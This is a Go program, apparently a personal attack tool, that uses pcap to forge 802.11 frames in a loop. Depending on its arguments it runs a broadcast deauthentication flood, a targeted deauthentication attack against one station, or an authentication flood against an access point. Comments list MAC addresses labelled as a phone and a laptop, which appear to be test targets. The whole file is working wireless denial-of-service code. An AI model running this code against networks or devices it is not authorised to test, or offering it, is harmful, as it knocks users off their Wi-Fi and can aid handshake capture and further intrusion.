package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/google/gopacket/pcap"
)

// 7A:46:D4:2B:D3:C7 phone
// C4-03-A8-40-00-60 laptop

type DRadioTap struct {
	Header       uint16
	HeaderLength uint16
	PresentFlags uint32
	TxFlags      uint16
	DataRetries  uint8
}

type DDot11 struct {
	Type            uint16
	Duration        uint16
	DestinationAddr [6]byte
	SourceAddr      [6]byte
	BssId           [6]byte
	FragSeq         uint16
}

func (ori DDot11) Swapped() DDot11 {
	temp := ori.DestinationAddr
	ori.DestinationAddr = ori.SourceAddr
	ori.SourceAddr = temp
	return ori
}

type DDotDeauth struct {
	Reason uint16
}

type DDotAuth struct {
	AuthAlgorithm uint16
	AuthSeq       uint16
	Status        uint16
}

func PanicError(err error) {
	if err != nil {
		log.Panic(err)
	}
}

func ExecutingBar(content string) {
	bar := "|/-\\"
	seq := 0
	for {
		fmt.Printf("Executing %s ... %s\r", content, string(bar[seq]))
		seq++
		seq %= len(bar)
		time.Sleep(time.Second / 10)
	}
}

func AddrToBytes(addr string) ([6]byte, error) {
	res := [6]byte{}
	slice := strings.Split(addr, ":")
	if len(slice) != 6 {
		return res, fmt.Errorf("wrong addr format : %s", addr)
	}
	for i, h := range slice {
		b, err := hex.DecodeString(h)
		if err != nil {
			return res, err
		}
		res[i] = b[0]
	}
	return res, nil
}

func packetSend(handle *pcap.Handle, buf *bytes.Buffer, layers ...interface{}) error {
	for _, j := range layers {
		err := binary.Write(buf, binary.LittleEndian, j)
		if err != nil {
			return err
		}
	}
	err := handle.WritePacketData(buf.Bytes())
	return err
}

func main() {
	handle, err := pcap.OpenLive(os.Args[1], 2048, true, pcap.BlockForever)
	PanicError(err)

	typeAuth := false
	typeUnicast := false
	typeBroadcast := false
	if len(os.Args) == 5 && os.Args[4] == "-auth" {
		typeAuth = true
	} else if len(os.Args) == 4 {
		typeUnicast = true
	} else if len(os.Args) == 3 {
		typeBroadcast = true
	} else {
		fmt.Println("wrong arguments : expected <interface> <ap addr> [<station addr> [-auth]]")
		os.Exit(1)
	}

	radioTap := DRadioTap{
		Header:       0,
		HeaderLength: 11,
		PresentFlags: 0x00028000,
		TxFlags:      0,
		DataRetries:  0,
	}

	dot := DDot11{
		Duration: 60,
		FragSeq:  0,
	}

	apAddr, err := AddrToBytes(os.Args[2])
	PanicError(err)
	dot.BssId = apAddr

	if typeAuth {
		dot.Type = 0x00b0
		stationAddr, err := AddrToBytes(os.Args[3])
		PanicError(err)
		dot.DestinationAddr = apAddr
		dot.SourceAddr = stationAddr
	}
	if typeUnicast {
		dot.Type = 0x00c0
		stationAddr, err := AddrToBytes(os.Args[3])
		PanicError(err)
		dot.DestinationAddr = stationAddr
		dot.SourceAddr = apAddr
	}
	if typeBroadcast {
		dot.Type = 0x00c0
		dot.DestinationAddr = [6]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
		dot.SourceAddr = apAddr
	}

	deauth := DDotDeauth{
		Reason: 0x0007,
	}

	auth := DDotAuth{
		AuthAlgorithm: 0,
		AuthSeq:       0x0001,
		Status:        0,
	}

	if typeAuth {
		go ExecutingBar("auth attack")
	}
	if typeUnicast {
		go ExecutingBar("deauth unicast attack")
	}
	if typeBroadcast {
		go ExecutingBar("deauth broadcast attack")
	}

	for {
		dot.FragSeq += 16

		packetBuffer := new(bytes.Buffer)

		if typeAuth {
			err = packetSend(handle, packetBuffer, radioTap, dot, auth)
			PanicError(err)
		} else {
			if typeUnicast {
				err = packetSend(handle, packetBuffer, radioTap, dot.Swapped(), deauth)
				PanicError(err)
			}
			packetBuffer.Reset()
			err = packetSend(handle, packetBuffer, radioTap, dot, deauth)
			PanicError(err)
		}
		time.Sleep(time.Millisecond * 10)
	}
}
